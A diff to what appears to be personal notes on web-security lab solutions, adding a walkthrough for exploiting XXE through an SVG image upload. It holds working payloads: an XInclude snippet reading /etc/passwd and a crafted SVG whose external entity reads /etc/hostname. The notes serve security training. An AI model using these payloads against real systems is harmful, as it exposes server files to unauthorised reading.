@@ -57,3 +57,17 @@
      2. In product id replace id of product with <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo> 
 
 #8 Lab: Exploiting XXE via image file upload
+
+
+     1. Create a svg file with the following content and save it as xxe.svg
+
+       <?xml version="1.0" ?>
+       <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+       <svg width="200px" height="150px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+       <text font-size="20" x="0" y="20">&xxe;</text>
+       </svg>
+     
+     2. Upload the file and inspect and hover on it to see the content of /etc/hostname
+     3. Submit the answer which is the content of /etc/hostname
+
+---------------------------------------------------------------------------------------
